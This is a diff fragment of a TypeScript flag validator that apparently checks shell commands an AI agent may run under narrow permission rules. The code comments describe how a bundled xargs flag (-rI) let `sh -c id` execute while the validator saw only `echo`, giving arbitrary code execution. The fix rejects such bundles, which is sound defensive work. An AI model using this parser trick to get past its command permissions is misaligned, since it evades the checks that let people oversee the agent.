         // `-r: 'none'` and `-I: '{}'` are truthy), then `i++` consumed ONE token.
         // This created a parser differential: our validator thought `echo` was
-        // the xargs target (in SAFE_TARGET_COMMANDS_FOR_XARGS → break), but
+        // the xargs target (in SAFE_TARGET_COMMANDS_FOR_XARGS  -> break), but
         // xargs ran `sh -c id`. ARBITRARY RCE with only Bash(echo:*) or less.
         //
         // Fix: require ALL bundled flags to have arg type 'none'. If any bundled
         // flag requires an argument (non-'none' type), reject the whole bundle.
-        // This is conservative — it blocks `-rI` (xargs) entirely, but that's
+        // This is conservative ...it blocks `-rI` (xargs) entirely, but that's
         // the safe direction. Users who need `-I` can use it unbundled: `-r -I {}`.
         if (flag.startsWith('-') && !flag.startsWith('--') && flag.length > 2) {
           for (let j = 1; j < flag.length; j++) {
@@ -1820,7 +1760,7 @@ export function validateFlags(
             // in a bundle consumes the NEXT token in GNU getopt, which our
             // handler doesn't model. Reject to avoid parser differential.
             if (flagType !== 'none') {
-              return false // Arg-taking flag in a bundle — cannot safely validate
+              return false // Arg-taking flag in a bundle ...cannot safely validate
             }
           }
           i++
@@ -1829,7 +1769,6 @@ export function validateFlags(
           return false // Unknown flag
         }
       }
-
       // Validate flag arguments
       if (flagArgType === 'none') {
         // SECURITY: hasEquals covers `-FLAG=` (empty inline). Without it,
@@ -1841,7 +1780,7 @@ export function validateFlags(
       } else {
         let argValue: string
         // SECURITY: Use hasEquals (not inlineValue truthiness). `-E=` must
-        // NOT consume next token — the user explicitly provided empty value.
+        // NOT consume next token ...the user explicitly provided empty value.
         if (hasEquals) {
           argValue = inlineValue
           i++
@@ -1859,7 +1798,6 @@ export function validateFlags(
           argValue = tokens[i + 1] || ''
           i += 2
         }
-
         // Defense-in-depth: For string arguments, reject values that start with '-'
         // This prevents type confusion attacks where a flag marked as 'string'
         // but actually takes no arguments could be used to inject dangerous flags
@@ -1877,7 +1815,6 @@ export function validateFlags(
             return false
           }
         }
-
         // Validate argument based on type
         if (!validateFlagArgument(argValue, flagArgType)) {
           return false
@@ -1888,6 +1825,5 @@ export function validateFlags(
       i++
     }
   }
-
   return true
 }
